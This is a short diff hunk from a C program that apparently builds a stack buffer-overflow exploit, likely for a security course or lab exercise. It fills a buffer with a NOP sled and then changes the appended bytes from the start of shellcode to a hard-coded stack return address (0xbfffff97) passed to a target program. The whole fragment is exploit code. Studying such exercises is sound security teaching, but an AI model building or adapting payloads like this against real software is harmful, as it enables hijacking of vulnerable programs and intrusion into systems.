@@ -19,7 +19,7 @@ int main(void)
   {
   	strcat(str, "\x90");
   }
-  strcat(str, "\x31\xc0\x31\xdb");
+  strcat(str, "\x97\xff\xff\xbf");
   // 0xbfffff97:	0xdb31c031
 
   args[0] = TARGET;
